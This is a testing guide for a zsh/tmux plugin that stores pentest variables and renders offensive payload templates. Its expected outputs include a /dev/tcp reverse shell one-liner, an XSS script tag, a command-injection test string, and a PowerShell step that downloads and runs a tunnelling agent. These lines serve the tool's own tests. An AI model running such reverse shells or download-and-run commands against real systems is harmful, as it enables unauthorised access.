# Testing

All commands below assume the repo is at:

```text
/mnt/d/4_L-Repo/0_Developing/dev-tui-jj-kali
```

## Syntax Check

Run from repo root:

```zsh
zsh -n ii.plugin.zsh
zsh -n lib/*.zsh
```

## Local Plugin Load Check

This does not require tmux:

```zsh
cd /mnt/d/4_L-Repo/0_Developing/dev-tui-jj-kali
zsh -fc 'source ./ii.plugin.zsh && type ii && ii p --help >/dev/null && print $II_PAYLOAD_DIR'
```

Expected result:

```text
ii is a shell function
/mnt/d/4_L-Repo/0_Developing/dev-tui-jj-kali/payloads
```

## Payload Category Filter Check

This verifies that `script` is a supported payload category and dotfiles used to
keep empty directories are not shown as payload entries.

```zsh
cd /mnt/d/4_L-Repo/0_Developing/dev-tui-jj-kali
zsh -fc 'source ./ii.plugin.zsh; ii_payload_list | grep -q "^script/.gitkeep$" && print bad || print ok'
zsh -fc 'source ./ii.plugin.zsh; print script/custom | ii_payload_filter script'
zsh -fc 'source ./ii.plugin.zsh; rendered="$(ii_payload_render payloads/script/tool/nmap/nmap)"; print -r -- "$rendered" | grep -Fq "sudo nmap -p- -Pn -T4 \$rhost" && print ok'
zsh -fc 'source ./ii.plugin.zsh; ii_payload_preview script/tool/nmap/nmap | grep -Fq "sudo nmap -p- -Pn -T4 \$rhost" && print ok'
```

Expected result:

```text
ok
script/custom
ok
ok
```

## Lowercase Payload Render Test

This verifies that normal payload rendering replaces lowercase `$name`
placeholders from tmux while leaving uppercase shell variables unchanged.

```zsh
tmux kill-session -t codex-ii-lower-payload 2>/dev/null || true
tmux new-session -d -s codex-ii-lower-payload -x 120 -y 30 zsh
tmux send-keys -t codex-ii-lower-payload "cd /mnt/d/4_L-Repo/0_Developing/dev-tui-jj-kali" Enter
tmux send-keys -t codex-ii-lower-payload "source ./ii.plugin.zsh" Enter
tmux send-keys -t codex-ii-lower-payload "ii s rhost 10.10.10.20" Enter
tmux send-keys -t codex-ii-lower-payload "ii_payload_render payloads/script/tool/nmap/nmap" Enter
sleep 2
tmux capture-pane -t codex-ii-lower-payload -p -S -80
tmux kill-session -t codex-ii-lower-payload
```

Expected sign:

```text
sudo nmap -p- -Pn -T4 10.10.10.20
```

Expected script copy sign:

```text
sudo nmap -p- -Pn -T4 $rhost
```

## Single Pane tmux Smoke Test

Run from outside or inside tmux. It creates an isolated session named
`codex-ii-test`.

```zsh
tmux kill-session -t codex-ii-test 2>/dev/null || true
tmux new-session -d -s codex-ii-test -x 120 -y 40 zsh
tmux send-keys -t codex-ii-test "cd /mnt/d/4_L-Repo/0_Developing/dev-tui-jj-kali" Enter
tmux send-keys -t codex-ii-test "source ./ii.plugin.zsh" Enter
tmux send-keys -t codex-ii-test "ii s LHOST 127.0.0.1" Enter
tmux send-keys -t codex-ii-test "ii s LPORT 4444" Enter
tmux send-keys -t codex-ii-test "ii s DOMAIN example.test" Enter
tmux send-keys -t codex-ii-test "ii ls" Enter
tmux send-keys -t codex-ii-test "ii ls host" Enter
tmux send-keys -t codex-ii-test "ii l" Enter
tmux send-keys -t codex-ii-test "FZF_DEFAULT_OPTS='--filter=sh-tcp' ii p linux" Enter
sleep 2
tmux capture-pane -t codex-ii-test -p -S -200
tmux kill-session -t codex-ii-test
```

Expected payload:

```text
/bin/sh -i >/dev/tcp/127.0.0.1/4444 2>&1 0>&1
```

Expected render report:

```text
lhost used from shell: 127.0.0.1
lport used from shell: 4444
```

## Cross Pane tmux Test

This verifies that `ii p` falls back to tmux session values when the rendering
pane has not run `ii l`.

```zsh
tmux kill-session -t codex-ii-crosspane 2>/dev/null || true
tmux new-session -d -s codex-ii-crosspane -x 120 -y 40 zsh
tmux split-window -t codex-ii-crosspane zsh
tmux send-keys -t codex-ii-crosspane:0.0 "cd /mnt/d/4_L-Repo/0_Developing/dev-tui-jj-kali" Enter
tmux send-keys -t codex-ii-crosspane:0.0 "source ./ii.plugin.zsh" Enter
tmux send-keys -t codex-ii-crosspane:0.0 "ii s LHOST 10.10.10.10" Enter
tmux send-keys -t codex-ii-crosspane:0.0 "ii s LPORT 9001" Enter
tmux send-keys -t codex-ii-crosspane:0.1 "cd /mnt/d/4_L-Repo/0_Developing/dev-tui-jj-kali" Enter
tmux send-keys -t codex-ii-crosspane:0.1 "source ./ii.plugin.zsh" Enter
tmux send-keys -t codex-ii-crosspane:0.1 "echo pane2-shell-before:\$LHOST" Enter
tmux send-keys -t codex-ii-crosspane:0.1 "FZF_DEFAULT_OPTS='--filter=sh-tcp' II_CLIP_CMD='tmux load-buffer -' ii p linux" Enter
sleep 2
tmux capture-pane -t codex-ii-crosspane:0.1 -p -S -120
tmux kill-session -t codex-ii-crosspane
```

Expected signs:

```text
pane2-shell-before:
/bin/sh -i >/dev/tcp/10.10.10.10/9001 2>&1 0>&1
lhost used from ii: 10.10.10.10
lport used from ii: 9001
```

## Payload Missing Variable Preservation Test

This verifies that missing payload variables keep their original token and are
reported as unresolved instead of blocking render/output.

```zsh
tmux kill-session -t codex-ii-payload-fallback 2>/dev/null || true
tmux new-session -d -s codex-ii-payload-fallback -x 120 -y 30 zsh
tmux send-keys -t codex-ii-payload-fallback "cd /mnt/d/4_L-Repo/0_Developing/dev-tui-jj-kali" Enter
tmux send-keys -t codex-ii-payload-fallback "source ./ii.plugin.zsh" Enter
tmux send-keys -t codex-ii-payload-fallback "printf 'y\n' | ii unset -a" Enter
tmux send-keys -t codex-ii-payload-fallback "ii s LHOST 127.0.0.1" Enter
tmux send-keys -t codex-ii-payload-fallback "FZF_DEFAULT_OPTS='--filter=sh-tcp' ii p linux" Enter
sleep 2
tmux capture-pane -t codex-ii-payload-fallback -p -S -140
tmux kill-session -t codex-ii-payload-fallback
```

Expected signs:

```text
/bin/sh -i >/dev/tcp/127.0.0.1/${lport} 2>&1 0>&1
lhost used from shell: 127.0.0.1
lport unresolved: kept as ${lport}
```

## Special Character Copy Test

This verifies that rendered payloads are piped into tmux buffer through stdin
and are not broken by common shell metacharacters.

```zsh
tmux kill-session -t codex-ii-special 2>/dev/null || true
tmux new-session -d -s codex-ii-special -x 120 -y 40 zsh
tmux send-keys -t codex-ii-special "cd /mnt/d/4_L-Repo/0_Developing/dev-tui-jj-kali" Enter
tmux send-keys -t codex-ii-special "source ./ii.plugin.zsh" Enter
tmux send-keys -t codex-ii-special "ii s DOMAIN \"a b/c;whoami & test\"" Enter
tmux send-keys -t codex-ii-special "FZF_DEFAULT_OPTS='--filter=basic-alert' II_PAYLOAD_KEY=y II_CLIP_CMD='tmux load-buffer -' ii p xss" Enter
sleep 2
tmux capture-pane -t codex-ii-special -p -S -120
tmux show-buffer
tmux kill-session -t codex-ii-special
```

Expected buffer:

```text
<script>alert('a b/c;whoami & test')</script>
```

## Input Render Test

This verifies that `ii p --input` renders lowercase variables, leaves uppercase
and PowerShell scope variables unchanged, stops at `.`, and copies only the
rendered body when `--copy` is used.

```zsh
tmux kill-session -t codex-ii-input 2>/dev/null || true
tmux new-session -d -s codex-ii-input -x 160 -y 60 zsh
tmux send-keys -t codex-ii-input "cd /mnt/d/4_L-Repo/0_Developing/dev-tui-jj-kali" Enter
tmux send-keys -t codex-ii-input "source ./ii.plugin.zsh" Enter
tmux send-keys -t codex-ii-input "ii s lhost 10.10.14.7" Enter
tmux send-keys -t codex-ii-input "file=/tmp/drop/agent.exe" Enter
tmux send-keys -t codex-ii-input "II_CLIP_CMD='tmux load-buffer -' ii p --input --copy" Enter
tmux send-keys -t codex-ii-input '$KALI = "$lhost"' Enter
tmux send-keys -t codex-ii-input '$FILE = "${file:t}"' Enter
tmux send-keys -t codex-ii-input 'Invoke-WebRequest "http://${KALI}/net/ligo/${FILE}" -OutFile "$env:TEMP\${RFILE}"' Enter
tmux send-keys -t codex-ii-input '& "$env:TEMP\$FILE" --connect $missing:11601 -selfcert' Enter
tmux send-keys -t codex-ii-input '.' Enter
sleep 2
tmux capture-pane -t codex-ii-input -p -S -120
tmux show-buffer
tmux kill-session -t codex-ii-input
```

Expected buffer:

```text
$KALI = "10.10.14.7"
$FILE = "agent.exe"
Invoke-WebRequest "http://${KALI}/net/ligo/${FILE}" -OutFile "$env:TEMP\${RFILE}"
& "$env:TEMP\$FILE" --connect :11601 -selfcert
```

## Payload Output Path Test

This verifies rendered payload output path resolution.

```zsh
zsh -fc 'source ./ii.plugin.zsh; ii_payload_output_path ""'
zsh -fc 'source ./ii.plugin.zsh; ii_payload_output_path filename'
zsh -fc 'source ./ii.plugin.zsh; ii_payload_output_path ./'
zsh -fc 'source ./ii.plugin.zsh; ii_payload_output_path ./payload.txt'
zsh -fc 'source ./ii.plugin.zsh; ii_payload_output_path /tmp/payload.txt'
```

Expected output:

```text
/www/p/att.txt
/www/filename
./att.txt
./payload.txt
/tmp/payload.txt
```

## OSC52 Sequence Test

This verifies that the OSC52 backend encodes special-character payload text
without shell escaping loss. It does not prove that the local terminal accepts
OSC52 clipboard writes.

```zsh
zsh -fc 'source ./ii.plugin.zsh; ii_clip_osc52_sequence "a b/c;whoami & test" | base64 | tr -d "\n"'
```

Expected sign:

```text
G101MjtjO1lTQmlMMk03ZDJodllXMXBJQ1lnZEdWemRBPT0H
```

## Variable Guard Test

```zsh
tmux kill-session -t codex-ii-vars 2>/dev/null || true
tmux new-session -d -s codex-ii-vars -x 120 -y 30 zsh
tmux send-keys -t codex-ii-vars "cd /mnt/d/4_L-Repo/0_Developing/dev-tui-jj-kali" Enter
tmux send-keys -t codex-ii-vars "source ./ii.plugin.zsh" Enter
tmux send-keys -t codex-ii-vars "ii s GOOD_NAME ok" Enter
tmux send-keys -t codex-ii-vars "ii ls good" Enter
tmux send-keys -t codex-ii-vars "ii unset GOOD_NAME" Enter
tmux send-keys -t codex-ii-vars "ii ls good" Enter
tmux send-keys -t codex-ii-vars "ii set 'BAD-NAME' value" Enter
sleep 2
tmux capture-pane -t codex-ii-vars -p -S -100
tmux kill-session -t codex-ii-vars
```

Expected signs:

```text
GOOD_NAME=ok
unset GOOD_NAME
ii: invalid variable name: BAD-NAME
```

## Unset All Test

```zsh
tmux kill-session -t codex-ii-unset-all 2>/dev/null || true
tmux new-session -d -s codex-ii-unset-all -x 120 -y 30 zsh
tmux send-keys -t codex-ii-unset-all "cd /mnt/d/4_L-Repo/0_Developing/dev-tui-jj-kali" Enter
tmux send-keys -t codex-ii-unset-all "source ./ii.plugin.zsh" Enter
tmux send-keys -t codex-ii-unset-all "ii s LHOST 192.0.2.10" Enter
tmux send-keys -t codex-ii-unset-all "ii s USER1 alice" Enter
tmux send-keys -t codex-ii-unset-all "printf 'n\n' | ii unset -a" Enter
tmux send-keys -t codex-ii-unset-all "ii ls" Enter
tmux send-keys -t codex-ii-unset-all "printf 'y\n' | ii unset -a" Enter
tmux send-keys -t codex-ii-unset-all "ii ls" Enter
sleep 2
tmux capture-pane -t codex-ii-unset-all -p -S -160
tmux kill-session -t codex-ii-unset-all
```

Expected signs:

```text
aborted
lhost=192.0.2.10
user1=alice
unset lhost
unset user1
unset 2 variable(s)
```

## Variable View Test

```zsh
tmux kill-session -t codex-ii-views 2>/dev/null || true
tmux new-session -d -s codex-ii-views -x 120 -y 35 zsh
tmux send-keys -t codex-ii-views "cd /mnt/d/4_L-Repo/0_Developing/dev-tui-jj-kali" Enter
tmux send-keys -t codex-ii-views "source ./ii.plugin.zsh" Enter
tmux send-keys -t codex-ii-views "ii s LHOST 192.0.2.10" Enter
tmux send-keys -t codex-ii-views "ii s RHOST 198.51.100.20" Enter
tmux send-keys -t codex-ii-views "ii s LPORT 4444" Enter
tmux send-keys -t codex-ii-views "ii s USER1 alice" Enter
tmux send-keys -t codex-ii-views "ii s PASSWD1 secret" Enter
tmux send-keys -t codex-ii-views "ii s HASH2 deadbeef" Enter
tmux send-keys -t codex-ii-views "ii ls host" Enter
tmux send-keys -t codex-ii-views "ii ls user" Enter
tmux send-keys -t codex-ii-views "ii ls passwd" Enter
tmux send-keys -t codex-ii-views "ii ls hash" Enter
sleep 2
tmux capture-pane -t codex-ii-views -p -S -160
tmux kill-session -t codex-ii-views
```

Expected signs:

```text
lhost
192.0.2.10
rhost
198.51.100.20
lport
4444
user1
alice
passwd1
secret
hash2
deadbeef
```

## Lowercase Input And Load Test

This verifies that lowercase input maps to the same tmux variable as uppercase
input, and that unset default names are not loaded into the shell.

```zsh
tmux kill-session -t codex-ii-case 2>/dev/null || true
tmux new-session -d -s codex-ii-case -x 120 -y 30 zsh
tmux send-keys -t codex-ii-case "cd /mnt/d/4_L-Repo/0_Developing/dev-tui-jj-kali" Enter
tmux send-keys -t codex-ii-case "source ./ii.plugin.zsh" Enter
tmux send-keys -t codex-ii-case "ii s user2 bob" Enter
tmux send-keys -t codex-ii-case "unset USER2 user2 PASSWD2 passwd2" Enter
tmux send-keys -t codex-ii-case "ii l" Enter
tmux send-keys -t codex-ii-case "echo user2:\$USER2/\$user2 passwd2:\${PASSWD2-unset}/\${passwd2-unset}" Enter
sleep 2
tmux capture-pane -t codex-ii-case -p -S -100
tmux kill-session -t codex-ii-case
```

Expected signs:

```text
user2=bob
loaded 1 variable(s)
user2:/bob passwd2:unset/unset
```

## Set Shortcut And Edit Test

This verifies that `ii s r`, `ii s:r`, and edit flow all target `RHOST`.

```zsh
tmux kill-session -t codex-ii-keys 2>/dev/null || true
tmux new-session -d -s codex-ii-keys -x 120 -y 40 zsh
tmux send-keys -t codex-ii-keys "cd /mnt/d/4_L-Repo/0_Developing/dev-tui-jj-kali" Enter
tmux send-keys -t codex-ii-keys "source ./ii.plugin.zsh" Enter
tmux send-keys -t codex-ii-keys "ii s r 10.0.0.5" Enter
tmux send-keys -t codex-ii-keys "ii s:r 10.0.0.6" Enter
tmux send-keys -t codex-ii-keys "II_SET_VALUE_FILTER=10.0.0.7 ii s r" Enter
tmux send-keys -t codex-ii-keys "II_EDIT_VALUE_FILTER=10.0.0.8 ii_cmd_interactive_edit_variable RHOST" Enter
tmux send-keys -t codex-ii-keys "ii ls host" Enter
sleep 3
tmux capture-pane -t codex-ii-keys -p -S -200
tmux show-buffer
tmux kill-session -t codex-ii-keys
```

Expected signs:

```text
rhost=10.0.0.5
rhost=10.0.0.6
rhost=10.0.0.7
rhost=10.0.0.8
```

## Set Filter Match Test

This verifies `ii s FILTER` handling for one match, no matches, and multiple
matches.

```zsh
tmux kill-session -t codex-ii-set-match 2>/dev/null || true
tmux new-session -d -s codex-ii-set-match -x 120 -y 35 zsh
tmux send-keys -t codex-ii-set-match "cd /mnt/d/4_L-Repo/0_Developing/dev-tui-jj-kali" Enter
tmux send-keys -t codex-ii-set-match "source ./ii.plugin.zsh" Enter
tmux send-keys -t codex-ii-set-match "II_SET_VALUE_FILTER=10.0.0.9 ii s r" Enter
tmux send-keys -t codex-ii-set-match "ii s nope" Enter
tmux send-keys -t codex-ii-set-match "FZF_DEFAULT_OPTS='--filter=LPORT' II_SET_VALUE_FILTER=443 ii s port" Enter
sleep 2
tmux capture-pane -t codex-ii-set-match -p -S -140
tmux kill-session -t codex-ii-set-match
```

Expected signs:

```text
rhost=10.0.0.9
no matched
lport=443
```

## Get Filter Match Test

This verifies `ii g FILTER` handling for one match, multiple matches, and abort.
It should copy and print selected values; abort should not copy anything.

```zsh
tmux kill-session -t codex-ii-get 2>/dev/null || true
tmux new-session -d -s codex-ii-get -x 120 -y 35 zsh
tmux send-keys -t codex-ii-get "cd /mnt/d/4_L-Repo/0_Developing/dev-tui-jj-kali" Enter
tmux send-keys -t codex-ii-get "source ./ii.plugin.zsh" Enter
tmux send-keys -t codex-ii-get "ii s LHOST 10.10.10.10" Enter
tmux send-keys -t codex-ii-get "ii s RHOST 10.10.10.20" Enter
tmux send-keys -t codex-ii-get "II_CLIP_CMD='tmux load-buffer -' ii g l" Enter
tmux send-keys -t codex-ii-get "FZF_DEFAULT_OPTS='--filter=RHOST' II_CLIP_CMD='tmux load-buffer -' ii g host" Enter
tmux send-keys -t codex-ii-get "FZF_DEFAULT_OPTS='--filter=nomatch' ii g host; print abort:\$?" Enter
sleep 2
tmux capture-pane -t codex-ii-get -p -S -120
tmux show-buffer
tmux kill-session -t codex-ii-get
```

Expected signs:

```text
value copied successfully
10.10.10.10
10.10.10.20
abort:1
```

## Clipboard Backend Command Test

This verifies clipboard backend inspection and tmux-session scoped backend
settings.

```zsh
tmux kill-session -t codex-ii-clip 2>/dev/null || true
tmux new-session -d -s codex-ii-clip -x 120 -y 30 zsh
tmux send-keys -t codex-ii-clip "cd /mnt/d/4_L-Repo/0_Developing/dev-tui-jj-kali" Enter
tmux send-keys -t codex-ii-clip "source ./ii.plugin.zsh" Enter
tmux send-keys -t codex-ii-clip "ii clip backend xclip-both" Enter
tmux send-keys -t codex-ii-clip "unset II_CLIP_BACKEND II_CLIP_CMD; ii clip backend" Enter
tmux send-keys -t codex-ii-clip "ii clip backend auto" Enter
sleep 2
tmux capture-pane -t codex-ii-clip -p -S -100
tmux kill-session -t codex-ii-clip
```

Expected signs:

```text
clipboard backend: xclip-both
backend: xclip-both
clipboard backend: auto
```

## Interactive Variable Copy Test

This uses fzf filter mode to verify that `ii i` copies selected variable values
with case-insensitive search. It should not load variables into the shell.

```zsh
tmux kill-session -t codex-ii-i 2>/dev/null || true
tmux new-session -d -s codex-ii-i -x 120 -y 30 zsh
tmux send-keys -t codex-ii-i "cd /mnt/d/4_L-Repo/0_Developing/dev-tui-jj-kali" Enter
tmux send-keys -t codex-ii-i "source ./ii.plugin.zsh" Enter
tmux send-keys -t codex-ii-i "ii s LHOST 172.16.1.10" Enter
tmux send-keys -t codex-ii-i "unset LHOST lhost ii_lhost" Enter
tmux send-keys -t codex-ii-i "FZF_DEFAULT_OPTS='--filter=lhost' II_INTERACTIVE_KEY=y II_CLIP_CMD='tmux load-buffer -' ii i" Enter
tmux send-keys -t codex-ii-i "echo loaded:\$LHOST/\$lhost" Enter
sleep 2
tmux capture-pane -t codex-ii-i -p -S -100
tmux show-buffer
tmux kill-session -t codex-ii-i
```

Expected signs:

```text
copied lhost
loaded:/
```

## Interactive Ordering Test

This verifies that populated variables are listed before empty default names in
the `ii i` selector source.

```zsh
tmux kill-session -t codex-ii-i-order 2>/dev/null || true
tmux new-session -d -s codex-ii-i-order -x 120 -y 30 zsh
tmux send-keys -t codex-ii-i-order "cd /mnt/d/4_L-Repo/0_Developing/dev-tui-jj-kali" Enter
tmux send-keys -t codex-ii-i-order "source ./ii.plugin.zsh" Enter
tmux send-keys -t codex-ii-i-order "ii s rhost 10.0.0.8" Enter
tmux send-keys -t codex-ii-i-order "ii s user alice" Enter
tmux send-keys -t codex-ii-i-order "ii_var_entries_for_fzf | head -n 5" Enter
sleep 2
tmux capture-pane -t codex-ii-i-order -p -S -100
tmux kill-session -t codex-ii-i-order
```

Expected signs:

```text
rhost
user
domain
```

## Interactive Add Variable Test

This verifies that `ii i` can create a new variable through the final add
option, and that empty values are stored but skipped by `ii l`.

```zsh
tmux kill-session -t codex-ii-add 2>/dev/null || true
tmux new-session -d -s codex-ii-add -x 120 -y 35 zsh
tmux send-keys -t codex-ii-add "cd /mnt/d/4_L-Repo/0_Developing/dev-tui-jj-kali" Enter
tmux send-keys -t codex-ii-add "source ./ii.plugin.zsh" Enter
tmux send-keys -t codex-ii-add "FZF_DEFAULT_OPTS='--filter=add' II_ADD_VAR_FILTER=token II_ADD_VALUE_FILTER=abc123 ii i" Enter
tmux send-keys -t codex-ii-add "FZF_DEFAULT_OPTS='--filter=add' II_ADD_VAR_FILTER=emptytest II_ADD_VALUE_FILTER= ii i" Enter
tmux send-keys -t codex-ii-add "unset TOKEN token EMPTYTEST emptytest" Enter
tmux send-keys -t codex-ii-add "ii l" Enter
tmux send-keys -t codex-ii-add "echo token:\$TOKEN/\$token empty:\${EMPTYTEST-unset}/\${emptytest-unset}" Enter
sleep 2
tmux capture-pane -t codex-ii-add -p -S -140
tmux kill-session -t codex-ii-add
```

Expected signs:

```text
TOKEN=abc123
EMPTYTEST=
loaded 1 variable(s)
token:abc123/abc123 empty:unset/unset
```

## Interactive Set Test

This verifies `ii s` with no arguments. `II_SET_VAR_FILTER` and
`II_SET_VALUE_FILTER` make the two fzf steps deterministic for testing.

```zsh
tmux kill-session -t codex-ii-s-filter 2>/dev/null || true
tmux new-session -d -s codex-ii-s-filter -x 120 -y 35 zsh
tmux send-keys -t codex-ii-s-filter "cd /mnt/d/4_L-Repo/0_Developing/dev-tui-jj-kali" Enter
tmux send-keys -t codex-ii-s-filter "source ./ii.plugin.zsh" Enter
tmux send-keys -t codex-ii-s-filter "II_SET_VAR_FILTER=LHOST II_SET_VALUE_FILTER=192.0.2.10 ii s" Enter
tmux send-keys -t codex-ii-s-filter "ii ls host" Enter
tmux send-keys -t codex-ii-s-filter "echo loaded:\$LHOST/\$lhost" Enter
tmux send-keys -t codex-ii-s-filter "echo hidden:\$ii_lhost" Enter
sleep 2
tmux capture-pane -t codex-ii-s-filter -p -S -120
tmux kill-session -t codex-ii-s-filter
```

Expected signs:

```text
lhost=192.0.2.10
loaded:/192.0.2.10
hidden:
```

## Manual Interactive Test

Inside an existing tmux session:

```zsh
cd /mnt/d/4_L-Repo/0_Developing/dev-tui-jj-kali
source ./ii.plugin.zsh

ii s LHOST 192.168.45.192
ii s LPORT 443
ii ls
ii i
ii p linux
```
